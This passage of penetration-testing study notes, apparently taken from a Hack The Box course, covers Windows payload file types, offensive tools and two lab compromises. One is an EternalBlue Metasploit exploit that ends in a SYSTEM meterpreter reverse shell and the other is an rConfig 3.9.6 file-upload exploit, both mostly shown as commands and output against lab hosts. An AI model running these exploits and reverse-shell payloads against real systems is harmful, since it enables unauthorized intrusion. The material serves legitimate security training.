are many other checks you can do. Now that we have discussed fingerprinting let's look at several file types and what they can be used for when building out payloads.\n\n---\n\n## Bats, DLLs, & MSI Files, Oh My!\n\nWhen it comes to creating payloads for Windows hosts, we have plenty of options to choose from. DLLs, batch files, MSI packages, and even PowerShell scripts are some of the most common methods to use. Each file type can accomplish different things for us, but what they all have in common is that they are executable on a host. Try to keep your delivery mechanism for the payload in mind, as this can determine what type of payload you use.\n\n#### Payload Types to Consider\n\n- [DLLs](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library) A Dynamic Linking Library (DLL) is a library file used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. These files are modular and allow us to have applications that are more dynamic and easier to update. As a pentester, injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls.\n    \n- [Batch](https://commandwindows.com/batch.htm) Batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter. These files end with an extension of `.bat`. We can use batch files to run commands on the host in an automated fashion. For example, we can have a batch file open a port on the host, or connect back to our attacking box. Once that is done, it can then perform basic enumeration steps and feed us info back over the open port.\n    \n- [VBS](https://www.guru99.com/introduction-to-vbscript.html) VBScript is a lightweight scripting language based on Microsoft's Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks aimed at having users perform an action such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code.\n    \n- [MSI](https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-file-extensions) `.MSI` files serve as an installation database for the Windows Installer. When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. We can use the Windows Installer by crafting a payload as an .msi file. Once we have it on the host, we can run `msiexec` to execute our file, which will provide us with further access, such as an elevated reverse shell.\n    \n- [Powershell](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1) Powershell is both a shell environment and scripting language. It serves as Microsoft's modern shell environment in their operating systems. As a scripting language, it is a dynamic language based on the .NET Common Language Runtime that, like its shell component, takes input and output as .NET objects. PowerShell can provide us with a plethora of options when it comes to gaining a shell and execution on a host, among many other steps in our penetration testing process.\n    \n\nNow that we understand what each type of Windows file can be used for let's discuss some basic tools, tactics, and procedures for building our payloads and delivering them onto the host to land a shell.\n\n---\n\n## Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution\n\nBelow you will find examples of different payload generation methods and ways to transfer our payloads to the victim. We will talk about some of these methods at a high level since our focus is on the payload generation itself and the different ways to acquire a shell on the target.\n\n#### Payload Generation\n\nWe have plenty of good options for dealing with generating payloads to use against Windows hosts. We touched on some of these already in previous sections. For example, the Metasploit-Framework and MSFVenom is a very handy way to generate payloads since it is OS agnostic. The table below lays out some of our options. However, this is not an exhaustive list, and new resources come out daily.\n\n|**Resource**|**Description**|\n|---|---|\n|`MSFVenom & Metasploit-Framework`|[Source](https://github.com/rapid7/metasploit-framework) MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife.|\n|`Payloads All The Things`|[Source](https://github.com/swisskyrepo/PayloadsAllTheThings) Here, you can find many different resources and cheat sheets for payload generation and general methodology.|\n|`Mythic C2 Framework`|[Source](https://github.com/its-a-feature/Mythic) The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.|\n|`Nishang`|[Source](https://github.com/samratashok/nishang) Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.|\n|`Darkarmour`|[Source](https://github.com/bats3c/darkarmour) Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.|\n\n#### Payload Transfer and Execution:\n\nBesides the vectors of web-drive-by, phishing emails, or dead drops, Windows hosts can provide us with several other avenues of payload delivery. The list below includes some helpful tools and protocols for use while attempting to drop a payload on a target.\n\n- `Impacket`: [Impacket](https://github.com/SecureAuthCorp/impacket) is a toolset built in Python that provides us with a way to interact with network protocols directly. Some of the most exciting tools we care about in Impacket deal with `psexec`, `smbclient`, `wmi`, Kerberos, and the ability to stand up an SMB server.\n- [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md): is a great resource to find quick oneliners to help transfer files across hosts expediently.\n- `SMB`: SMB can provide an easy to exploit route to transfer files between hosts. This can be especially useful when the victim hosts are domain joined and utilize shares to host data. We, as attackers, can use these SMB file shares along with C$ and admin$ to host and transfer our payloads and even exfiltrate data over the links.\n- `Remote execution via MSF`: Built into many of the exploit modules in Metasploit is a function that will build, stage, and execute the payloads automatically.\n- `Other Protocols`: When looking at a host, protocols such as FTP, TFTP, HTTP/S, and more can provide you with a way to upload files to the host. Enumerate and pay attention to the functions that are open and available for use.\n\nNow that we know what tools, tactics, and procedures we can use to transfer our payloads, let's check out an example compromise process.\n\n---\n\n## Example Compromise Walkthrough\n\n1. Enumerate The Host\n\nPing, Netcat, Nmap scans, and even Metasploit are all good options to start enumerating our potential victims. To start this time, we will utilize an Nmap scan. The enumeration portion of any exploit chain is arguably the most critical piece of the puzzle. Understanding the target and what makes it tick will raise your chances of gaining a shell.\n\n#### Enumerate the Host\n\nInfiltrating Windows\n\n```shell-session\ndrxh3kr@htb[/htb]$ nmap -v -A 10.129.201.97\n\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 18:13 EDT\nNSE: Loaded 153 scripts for scanning.\nNSE: Script Pre-scanning.\n\nDiscovered open port 135/tcp on 10.129.201.97\nDiscovered open port 80/tcp on 10.129.201.97\nDiscovered open port 445/tcp on 10.129.201.97\nDiscovered open port 139/tcp on 10.129.201.97\nCompleted Connect Scan at 18:13, 12.76s elapsed (1000 total ports)\nCompleted Service scan at 18:13, 6.62s elapsed (4 services on 1 host)\nNSE: Script scanning 10.129.201.97.\nNmap scan report for 10.129.201.97\nHost is up (0.13s latency).\nNot shown: 996 closed ports\nPORT    STATE SERVICE      VERSION\n80/tcp  open  http         Microsoft IIS httpd 10.0\n| http-methods: \n|   Supported Methods: OPTIONS TRACE GET HEAD POST\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: 10.129.201.97 - /\n135/tcp open  msrpc        Microsoft Windows RPC\n139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 2h20m00s, deviation: 4h02m30s, median: 0s\n| smb-os-discovery: \n|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)\n|   Computer name: SHELLS-WINBLUE\n|   NetBIOS computer name: SHELLS-WINBLUE\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2021-09-27T15:13:28-07:00\n| smb-security-mode: \n|   account_used: <blank>\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2021-09-27T22:13:30\n|_  start_date: 2021-09-23T15:29:29\n\n```\n\nWe figured out a few things during scanning & validation of the example host in question. It is running `Windows Server 2016 Standard 6.3`. We have the hostname now, and we know it is not in a domain and is running several services. Now that we have gathered some information let's determine our potential exploit path.  \n`IIS` could be a potential path, attempting to access the host over SMB utilizing a tool like Impacket or authenticating if we had credentials could do it, and from an OS perspective, there may be a route for an RCE as well. MS17-010 (EternalBlue) has been known to affect hosts ranging from Windows 2008 to Server 2016. With this in mind, it could be a solid bet that our victim is vulnerable since it falls in that window. Let's validate that using a builtin auxiliary check from `Metasploit`, `auxiliary/scanner/smb/smb_ms17_010`.\n\n2. Search for and decide on an exploit path\n\nOpen `msfconsole` and search for EternalBlue, or you can use the string in the session below to use the check. Set the RHOSTS field with the target's IP address and initiate the scan. As can be seen in the options for the module, you can fill in more of the SMB settings, but it is not necessary. They will help to make the check more likely to succeed. When ready, type `run`.\n\n#### Determine an Exploit Path\n\nInfiltrating Windows\n\n```shell-session\nmsf6 auxiliary(scanner/smb/smb_ms17_010) > use auxiliary/scanner/smb/smb_ms17_010 \nmsf6 auxiliary(scanner/smb/smb_ms17_010) > show options\n\nModule options (auxiliary/scanner/smb/smb_ms17_010):\n\n   Name         Current Setting                 Required  Description\n   ----         ---------------                 --------  -----------\n   CHECK_ARCH   true                            no        Check for architecture on vulnerable hosts\n   CHECK_DOPU   true                            no        Check for DOUBLEPULSAR on vulnerable hosts\n   CHECK_PIPE   false                           no        Check for named pipe on vulnerable hosts\n   NAMED_PIPES  /usr/share/metasploit-framewor  yes       List of named pipes to check\n                k/data/wordlists/named_pipes.t\n                xt\n   RHOSTS                                       yes       The target host(s), range CIDR identifier, or hosts f\n                                                          ile with syntax 'file:<path>'\n   RPORT        445                             yes       The SMB service port (TCP)\n   SMBDomain    .                               no        The Windows domain to use for authentication\n   SMBPass                                      no        The password for the specified username\n   SMBUser                                      no        The username to authenticate as\n   THREADS      1                               yes       The number of concurrent threads (max one per host)\n\nmsf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.129.201.97\n\nRHOSTS => 10.129.201.97\nmsf6 auxiliary(scanner/smb/smb_ms17_010) > run\n\n[+] 10.129.201.97:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)\n[*] 10.129.201.97:445     - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n```\n\nNow, we can see from the check results that our target is likely vulnerable to EternalBlue. Let's set up the exploit and payload now, then give it a shot.\n\n3. Select Exploit & Payload, then Deliver\n\n#### Choose & Configure Our Exploit & Payload\n\nInfiltrating Windows\n\n```shell-session\nmsf6 > search eternal\n\nMatching Modules\n================\n\n   #  Name                                           Disclosure Date  Rank     Check  Description\n   -  ----                                           ---------------  ----     -----  -----------\n   0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption\n   1  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+\n   2  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution\n   3  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution\n   4  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection\n   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution\n```\n\nFor this instance, we dug through MSF's exploit modules utilizing the search function to look for an exploit matching EternalBlue. The list above was the result. Since I have had more luck with the `psexec` version of this exploit, we will try that one first. Let's choose it and continue the setup.\n\n#### Configure The Exploit & Payload\n\nInfiltrating Windows\n\n```shell-session\nmsf6 > use 2\n[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp\nmsf6 exploit(windows/smb/ms17_010_psexec) > options\n\nModule options (exploit/windows/smb/ms17_010_psexec):\n\n   Name                  Current Setting              Required  Description\n   ----                  ---------------              --------  -----------\n   DBGTRACE              false                        yes       Show extra debug trace info\n   LEAKATTEMPTS          99                           yes       How many times to try to leak transaction\n   NAMEDPIPE                                          no        A named pipe that can be connected to (leave bl\n                                                                ank for auto)\n   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check\n                         work/data/wordlists/named_p\n                         ipes.txt\n   RHOSTS                                             yes       The target host(s), range CIDR identifier, or h\n                                                                osts file with syntax 'file:<path>'\n   RPORT                 445                          yes       The Target port (TCP)\n   SERVICE_DESCRIPTION                                no        Service description to to be used on target for\n                                                                 pretty listing\n   SERVICE_DISPLAY_NAME                               no        The service display name\n   SERVICE_NAME                                       no        The service name\n   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share\n                                                                (ADMIN$,C$,...) or a normal read/write folder s\n                                                                hare\n   SMBDomain             .                            no        The Windows domain to use for authentication\n   SMBPass                                            no        The password for the specified username\n   SMBUser                                            no        The username to authenticate as\n\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     192.168.86.48    yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n```\n\nBe sure to set your payload options correctly before running the exploit. Any options that have `Required` set to yes will be a necessary space to fill. In this instance, we need to ensure that our `RHOSTS, LHOST, and LPORT` fields are correctly set. For this attempt, accepting the defaults for the rest is OK.\n\n#### Validate Our Options\n\nInfiltrating Windows\n\n```shell-session\nmsf6 exploit(windows/smb/ms17_010_psexec) > show options\n\nModule options (exploit/windows/smb/ms17_010_psexec):\n\n   Name                  Current Setting              Required  Description\n   ----                  ---------------              --------  -----------\n   DBGTRACE              false                        yes       Show extra debug trace info\n   LEAKATTEMPTS          99                           yes       How many times to try to leak transaction\n   NAMEDPIPE                                          no        A named pipe that can be connected to (leave bl\n                                                                ank for auto)\n   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check\n                         work/data/wordlists/named_p\n                         ipes.txt\n   RHOSTS                10.129.201.97                yes       The target host(s), range CIDR identifier, or h\n                                                                osts file with syntax 'file:<path>'\n   RPORT                 445                          yes       The Target port (TCP)\n   SERVICE_DESCRIPTION                                no        Service description to to be used on target for\n                                                                 pretty listing\n   SERVICE_DISPLAY_NAME                               no        The service display name\n   SERVICE_NAME                                       no        The service name\n   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share\n                                                                (ADMIN$,C$,...) or a normal read/write folder s\n                                                                hare\n   SMBDomain             .                            no        The Windows domain to use for authentication\n   SMBPass                                            no        The password for the specified username\n   SMBUser                                            no        The username to authenticate as\n\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.10.14.12      yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n```\n\nThis time, we kept it simple and just used a `windows/meterpreter/reverse_tcp` payload. You can change this as you wish for a different shell type or obfuscate your attack more, as shown in the previous payloads sections. With our options set, let's give this a try and see if we land a shell.\n\n4. Execute Attack, and Receive A Callback.\n\n#### Execute Our Attack\n\nInfiltrating Windows\n\n```shell-session\nmsf6 exploit(windows/smb/ms17_010_psexec) > exploit\n\n[*] Started reverse TCP handler on 10.10.14.12:4444 \n[*] 10.129.201.97:445 - Target OS: Windows Server 2016 Standard 14393\n[*] 10.129.201.97:445 - Built a write-what-where primitive...\n[+] 10.129.201.97:445 - Overwrite complete... SYSTEM session obtained!\n[*] 10.129.201.97:445 - Selecting PowerShell target\n[*] 10.129.201.97:445 - Executing the payload...\n[+] 10.129.201.97:445 - Service start timed out, OK if running a command or non-service executable...\n[*] Sending stage (175174 bytes) to 10.129.201.97\n[*] Meterpreter session 1 opened (10.10.14.12:4444 -> 10.129.201.97:50215) at 2021-09-27 18:58:00 -0400\n\nmeterpreter > getuid\n\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter > \n```\n\nSuccess! We have landed our exploit and gained a shell session. A `SYSTEM` level shell at that. As seen in the earlier MSF modules, now that we have an open session through Meterpreter, we are presented with the `meterpreter >` prompt. From here, we can utilize Meterpreter to run further commands to gather system information, steal user credentials, or use another post-exploitation module against the host. If you wish to interact with the host directly, you can also drop into an interactive shell session on the host from Meterpreter.\n\n5. Identify the Native Shell.\n\n#### Identify Our Shell\n\nInfiltrating Windows\n\n```shell-session\nmeterpreter > shell\n\nProcess 4844 created.\nChannel 1 created.\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32>\n```\n\nWhen we executed the Meterpreter command `shell`, it started another process on the host and dropped us into a system shell. Can you determine what we are in from the prompt? Just seeing `C:\\Windows\\system32>` can clue us in that we are just in a `cmd.exe shell`. To make sure, simply running the command help from within the shell will also let you know. If we were dropped into PowerShell, our prompt would look like `PS C:\\Windows\\system32>`. The PS in front lets us know it is a PowerShell session. Congrats on dropping into a shell on our latest exploited Windows host.\n\nNow that we have run through a sample compromise process let's examine the shells you can see when you land on the host.\n\n---\n\n## CMD-Prompt and Power[Shell]s for Fun and Profit.\n\nWe are fortunate with Windows hosts to have not one but two choices for shells to utilize by default. Now you may be wondering:\n\n`Which one is the right one to use?`\n\nThe answer is simple, the one that provides you with the capability you need at the time. Compare `cmd` and `PowerShell` for a minute to get a sense of what they offer and when it would be best to pick one over the other.\n\nCMD shell is the original MS-DOS shell built into Windows. It was made for basic interaction and I.T. operations on a host. Some simple automation could be achieved with batch files, but that was all. Powershell came along with a purpose to expand the capabilities of cmd. PowerShell understands the native MS-DOS commands utilized in CMD and a whole new set of commands based in .NET. New self-sufficient modules can also be implemented into PowerShell with cmdlets. CMD prompt deals with text input and output while Powershell utilizes .NET objects for all input and output. Another important consideration is that CMD does not keep a record of the commands used during the session whereas, PowerShell does. So in the context of being stealthy, executing commands with cmd will leave less of a trace on the host. Other potential problems such as `Execution Policy` and `User Account Control (UAC)` can inhibit your ability to execute commands and scripts on the host. These considerations affect `PowerShell` but not cmd. Another big concern to take into account is the age of the host. If you land on a Windows XP or older host ( yes, it's still possible..) PowerShell is not present, so your only option will be cmd. PowerShell did not come to fruition until Windows 7. So to sum it all up:\n\nUse `CMD` when:\n\n- You are on an older host that may not include PowerShell.\n- When you only require simple interactions/access to the host.\n- When you plan to use simple batch files, net commands, or MS-DOS native tools.\n- When you believe that execution policies may affect your ability to run scripts or other actions on the host.\n\nUse `PowerShell` when:\n\n- You are planning to utilize cmdlets or other custom-built scripts.\n- When you wish to interact with .NET objects instead of text output.\n- When being stealthy is of lesser concern.\n- If you are planning to interact with cloud-based services and hosts.\n- If your scripts set and use Aliases.\n\n---\n\n## WSL and PowerShell For Linux\n\nThe Windows Subsystem for Linux is a powerful new tool that has been introduced to Windows hosts that provides a virtual Linux environment built into your host. We mention this because the rapidly changing landscape of operating systems may very well allow for novel ways of gaining access to a host. When writing this module, several examples of malware in the wild were attempting to utilize Python3 and Linux binaries to download and install payloads onto a Windows host via WSL. Much like in this post [here](https://www.bleepingcomputer.com/news/security/new-malware-uses-windows-subsystem-for-linux-for-stealthy-attacks/), attackers are also using built-in Python libraries that are native to both Windows and Linux alongside PowerShell to perform other actions on the host. One other thing to note is currently, any network requests or functions executed to or from the WSL instance are not parsed by the Windows Firewall and Windows Defender, making it a bit of a blind spot on the host.\n\nThe same issues can currently be found via PowerShell Core, which can be installed on Linux operating systems and carry over many normal PowerShell functions. These two concepts are exceptionally sneaky because, to date, not much is known about the vectors of attack or ways to watch for them. But attacks aimed at these features have been seen to avoid AV and EDR detection mechanisms. These concepts are a bit advanced for this module but look for them in a future module.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/07-Shells & Payloads/11-Infiltrating Unix & Linux",
    "path": "02_CPTS/07-Shells & Payloads/11-Infiltrating Unix & Linux.md",
    "title": "11 Infiltrating Unix & Linux",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- W3Techs maintains an ongoing OS usage statistics study. This study reports that over 70% of websites (webservers) run on a Unix-based system. For us, this means we can significantly benefit from c...",
    "category": "02_CPTS",
    "content": "\n---\n\nW3Techs maintains an ongoing OS usage statistics [study](https://w3techs.com/technologies/overview/operating_system). This study reports that over `70%` of websites (webservers) run on a Unix-based system. For us, this means we can significantly benefit from continuing to grow our knowledge of Unix/Linux and how we can gain shell sessions on these environments to potentially pivot further within an environment. While it is common for organizations to use 3rd parties & cloud providers to host their websites & web apps, many organizations still host their websites & web applications on servers in their network environments (on-prem). In these cases, we would want to establish a shell session with the underlying system to attempt to pivot to other systems on the internal network.\n\n---\n\n## Common Considerations\n\nAs you may very well have noticed by now, gaining a shell session with a system can be done in various ways, one common way is through a vulnerability in an application. We will identify a vulnerability and discover an exploit that we can use to gain a shell by delivering a payload. When considering how we will establish a shell session on a Unix/Linux system, we will benefit from considering the following:\n\n- What distribution of Linux is the system running?\n    \n- What shell & programming languages exist on the system?\n    \n- What function is the system serving for the network environment it is on?\n    \n- What application is the system hosting?\n    \n- Are there any known vulnerabilities?\n    \n\nLet's dive deeper into this concept by attacking a vulnerable application hosted on a Linux system. Keep the questions in mind and take notes as we go through this. Can you answer them?\n\n---\n\n## Gaining a Shell Through Attacking a Vulnerable Application\n\nAs in most engagements, we will start with an initial enumeration of the system using `Nmap`.\n\n#### Enumerate the Host\n\nInfiltrating Unix/Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ nmap -sC -sV 10.129.201.101\n\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 09:09 EDT\nNmap scan report for 10.129.201.101\nHost is up (0.11s latency).\nNot shown: 994 closed ports\nPORT     STATE SERVICE  VERSION\n21/tcp   open  ftp      vsftpd 2.0.8 or later\n22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)\n| ssh-hostkey: \n|   2048 2d:b2:23:75:87:57:b9:d2:dc:88:b9:f4:c1:9e:36:2a (RSA)\n|   256 c4:88:20:b0:22:2b:66:d0:8e:9d:2f:e5:dd:32:71:b1 (ECDSA)\n|_  256 e3:2a:ec:f0:e4:12:fc:da:cf:76:d5:43:17:30:23:27 (ED25519)\n80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)\n|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34\n|_http-title: Did not follow redirect to https://10.129.201.101/\n111/tcp  open  rpcbind  2-4 (RPC #100000)\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  3,4          111/tcp6  rpcbind\n|_  100000  3,4          111/udp6  rpcbind\n443/tcp  open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)\n|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\n| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--\n| Not valid before: 2021-09-24T19:29:26\n|_Not valid after:  2022-09-24T19:29:26\n|_ssl-date: TLS randomness does not represent time\n3306/tcp open  mysql    MySQL (unauthorized)\n```\n\nKeeping our goal of `gaining a shell session` in mind, we must establish some next steps after examining our scan output.\n\n`What information could we gather from the output?`\n\nConsidering we can see the system is listening on ports 80 (`HTTP`), 443 (`HTTPS`), 3306 (`MySQL`), and 21 (`FTP`), it may be safe to assume that this is a web server hosting a web application. We can also see some version numbers revealed associated with the web stack (`Apache 2.4.6` and `PHP 7.2.34` ) and the distribution of Linux running on the system (`CentOS`). Before deciding on a direction to research further (dive down a rabbit hole), we should also try navigating to the IP address through a web browser to discover the hosted application if possible.\n\n#### rConfig Management Tool\n\n![The image shows the rConfig Configuration Management login page with fields for username and password, a \"Remember me\" checkbox, and a \"Forgot my password?\" link. The rConfig logo is displayed on the right.](https://academy.hackthebox.com/storage/modules/115/rconfig.png)\n\nHere we discover a network configuration management tool called [rConfig](https://www.rconfig.com). This application is used by network & system administrators to automate the process of configuring network appliances. One practical use case would be to use rConfig to remotely configure network interfaces with IP addressing information on multiple routers simultaneously. This tool saves admins time but, if compromised, could be used to pivot onto critical network devices that switch & route packets across the network. A malicious attacker could own the entire network through rConfig since it will likely have admin access to all the network appliances used to configure. As pentesters, finding a vulnerability in this application would be considered a very critical discovery.\n\n---\n\n## Discovering a Vulnerability in rConfig\n\nTake a close look at the bottom of the web login page, and we can see the rConfig version number (`3.9.6`). We should use this information to start looking for any `CVEs`, `publicly available exploits`, and `proof of concepts` (`PoCs`). As we research, be sure to look closely at what we find and understand what it is doing. We, of course, want it to lead us to a shell session with the target.\n\nUsing your search engine of choice will turn up some promising results. We can use the keywords: `rConfig 3.9.6 vulnerability.`\n\n![The image shows a Google search results page for \"rconfig 3.9.6 vulnerability.\" The top results include links to exploit-db.com and mageni.net, discussing arbitrary file upload to remote code execution and multiple vulnerabilities in rConfig 3.9.6.](https://academy.hackthebox.com/storage/modules/115/rconfigresearch.png)\n\nWe can see that it may be worthwhile to choose this as the main focus of our research. The same thinking could be applied to the Apache and PHP versions, but since the application is running on the web stack, let's see if we can gain a shell through an exploit written for the vulnerabilities found in rConfig.\n\nWe can also use Metasploit's search functionality to see if any exploit modules can get us a shell session on the target.\n\n#### Search For an Exploit Module\n\nInfiltrating Unix/Linux\n\n```shell-session\nmsf6 > search rconfig\n\nMatching Modules\n================\n\n   #  Name                                             Disclosure Date  Rank       Check  Description\n   -  ----                                             ---------------  ----       -----  -----------\n   0  exploit/multi/http/solr_velocity_rce             2019-10-29       excellent  Yes    Apache Solr Remote Code Execution via Velocity Template\n   1  auxiliary/gather/nuuo_cms_file_download          2018-10-11       normal     No     Nuuo Central Management Server Authenticated Arbitrary File Download\n   2  exploit/linux/http/rconfig_ajaxarchivefiles_rce  2020-03-11       good       Yes    Rconfig 3.x Chained Remote Code Execution\n   3  exploit/unix/webapp/rconfig_install_cmd_exec     2019-10-28       excellent  Yes    rConfig install Command Execution\n```\n\nOne detail that can be overlooked when relying on MSF to find an exploit module for a specific application is the version of MSF. There may be useful exploit modules that are not installed on our system or just aren't showing up via search. In these cases, it's good to know that Rapid 7 keeps code for exploit modules in their [repos on github](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits). We could do an even more specific search using a search engine: `rConfig 3.9.6 exploit metasploit github`\n\nThis search can point us to the source code for an exploit module called `rconfig_vendors_auth_file_upload_rce.rb`. This exploit can get us a shell session on a target Linux box running rConfig 3.9.6. If this exploit did not show up in the MSF search, we can copy the code from this repo onto our local attack box and save it in the directory that our local install of MSF is referencing. To do this, we can issue this command on our attack box:\n\n#### Locate\n\nInfiltrating Unix/Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ locate exploits\n```\n\nWe want to look for the directories in the output associated with Metasploit Framework. On Pwnbox, Metasploit exploit modules are kept in:\n\n`/usr/share/metasploit-framework/modules/exploits`\n\nWe can copy the code into a file and save it in `/usr/share/metasploit-framework/modules/exploits/linux/http` similar to where they are storing the code in the GitHub repo. We should also keep msf up to date using the commands `apt update; apt install metasploit-framework` or your local package manager. Once we find the exploit module and download it (we can use wget) or copy it into the proper directory from Github, we can use it to gain a shell session on the target. If we copy it into a file on our local system, make sure the file has `.rb` as the extension. All modules in MSF are written in Ruby.\n\n---\n\n## Using the rConfig Exploit and Gaining a Shell\n\nIn msfconsole, we can manually load the exploit using the command:\n\n#### Select an Exploit\n\nInfiltrating Unix/Linux\n\n```shell-session\nmsf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce\n```\n\nWith this exploit selected, we can list the options, input the proper settings specific to our network environment, and launch the exploit.\n\nUse what you have learned in the module thus far to fill out the options associated with the exploit.\n\n#### Execute the Exploit\n\nInfiltrating Unix/Linux\n\n```shell-session\nmsf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit\n\n[*] Started reverse TCP handler on 10.10.14.111:4444 \n[*] Running automatic check (\"set AutoCheck false\" to disable)\n[+] 3.9.6 of rConfig found !\n[+] The target appears to be vulnerable. Vulnerable version of rConfig found !\n[+] We successfully logged in !\n[*] Uploading file 'olxapybdo.php' containing the payload...\n[*] Triggering the payload ...\n[*] Sending stage (39282 bytes) to 10.129.201.101\n[+] Deleted olxapybdo.php\n[*] Meterpreter session 1 opened (10.10.14.111:4444 -> 10.129.201.101:38860) at 2021-09-27 13:49:34 -0400\n\nmeterpreter > dir\nListing: /home/rconfig/www/images/vendor\n========================================\n\nMode              Size  Type  Last modified              Name\n----              ----  ----  -------------              ----\n100644/rw-r--r--  673   fil   2020-09-03 05:49:58 -0400  ajax-loader.gif\n100644/rw-r--r--  1027  fil   2020-09-03 05:49:58 -0400  cisco.jpg\n100644/rw-r--r--  1017  fil   2020-09-03 05:49:58 -0400  juniper.jpg\n```\n\nWe can see from the steps outlined in the exploitation process that this exploit:\n\n- Checks for the vulnerable version of rConfig\n- Authenticates with the rConfig web login\n- Uploads a PHP-based payload for a reverse shell connection\n- Deletes the payload\n- Leaves us with a Meterpreter shell session\n\n#### Interact With the Shell\n\nInfiltrating Unix/Linux\n\n```shell-session\n\nmeterpreter > shell\n\nProcess 3958 created.\nChannel 0 created.\ndir\najax-loader.gif  cisco.jpg  juniper.jpg\nls\najax-loader.gif\ncisco.jpg\njuniper.jpg\n```\n\nWe can drop into a system shell (`shell`) to gain access to the target system as if we were logged in and open a terminal.\n\n---\n\n## Spawning a TTY Shell with Python\n\nWhen we drop into the system shell, we notice that no prompt is present, yet we can still issue some system commands. This is a shell typically referred to as a `non-tty shell`. These shells have limited functionality and can often prevent our use of essential commands like `su` (`switch user`) and `sudo` (`super user do`), which we will likely need if we seek to escalate privileges. This happened because the payload was executed on the target by the apache user. Our session is established as the apache user. Normally, admins are not accessing the system as the apache user, so there is no need for a shell interpreter language to be defined in the environment variables associated with apache.\n\nWe can manually spawn a TTY shell using Python if it is present on the system. We can always check for Python's presence on Linux systems by typing the command: `which python`. To spawn the TTY shell session using Python, we type the following command:\n\n#### Interactive Python\n\nInfiltrating 